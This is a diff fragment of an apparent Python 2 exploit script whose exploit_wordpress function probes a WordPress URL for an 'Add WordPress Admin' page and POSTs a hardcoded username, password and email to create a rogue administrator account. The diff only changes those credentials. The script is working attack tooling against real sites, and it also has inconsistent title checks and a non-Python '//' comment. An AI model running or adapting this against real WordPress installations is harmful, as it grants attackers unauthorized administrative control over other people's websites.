@@ -35,9 +35,9 @@ def exploit_wordpress(url):
         response = requests.get(target_url, verify=False, timeout=15)
         if "<title>Add a New WordPress Admin</title>" in response.text:
             if re.search(r'<title>Add WordPress Admin</title>', response.text, re.IGNORECASE | re.UNICODE):
-                user_name = 'optimasprime'
-                pwd = 'optimasprimetools'
-                payload = {'user_name': user_name, 'pwd': pwd, 'email': 'youremail@mail.com'}  // edit with your email
+                user_name = 'newadmin'
+                pwd = 'newadminpassword123'
+                payload = {'user_name': user_name, 'pwd': pwd, 'email': 'youremail@mail.com'} 
                 response = requests.post(target_url, data=payload, verify=False, timeout=15)
                 if "youremail@mail.com" in response.text:
                     print ' => {} --> {}[Successfully User added]{}'.format(url, GREEN, RESET)
